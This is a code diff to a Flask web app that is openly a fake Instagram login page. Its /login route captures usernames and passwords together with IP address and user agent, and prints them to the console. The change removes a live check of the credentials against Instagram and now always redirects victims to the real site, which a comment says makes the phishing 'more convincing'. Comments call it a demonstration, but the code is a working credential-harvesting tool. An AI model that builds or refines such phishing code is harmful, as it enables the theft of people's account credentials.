@@ -218,18 +218,17 @@ def index():
 
 @app.route('/login', methods=['POST'])
 def login():
-    """Capture credentials and verify with Instagram, then redirect"""
+    """Capture credentials and redirect to Instagram"""
     username = request.form.get('username', '')
     password = request.form.get('password', '')
     
-    # Verify credentials with actual Instagram
-    is_valid = verify_instagram_login(username, password)
+    # For phishing demonstration, we capture credentials but don't verify them
+    # The point is to show how easily data can be stolen, not to validate it
     
     # Capture the data with timestamp
     data = {
         'username': username,
         'password': password,
-        'valid': is_valid,
         'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
         'ip_address': request.remote_addr,
         'user_agent': request.headers.get('User-Agent', 'Unknown')
@@ -243,18 +242,13 @@ def login():
     print(f"{'='*60}")
     print(f"Username: {username}")
     print(f"Password: {password}")
-    print(f"Valid: {'✅ YES' if is_valid else '❌ NO'}")
     print(f"Time: {data['timestamp']}")
     print(f"IP: {data['ip_address']}")
     print(f"{'='*60}\n")
     
-    if is_valid:
-        # Only redirect if credentials are valid
-        instagram_post_url = "https://www.instagram.com/p/DQnya2Nkm8i/?hl=en"
-        return jsonify({'status': 'success', 'redirect': instagram_post_url})
-    else:
-        # Return error if invalid
-        return jsonify({'status': 'error', 'message': 'Sorry, your password was incorrect. Please double-check your password.'}), 401
+    # Always redirect to Instagram (makes the phishing more convincing)
+    instagram_url = "https://www.instagram.com/"
+    return jsonify({'status': 'success', 'redirect': instagram_url})
 
 @app.route('/reveal')
 def reveal():
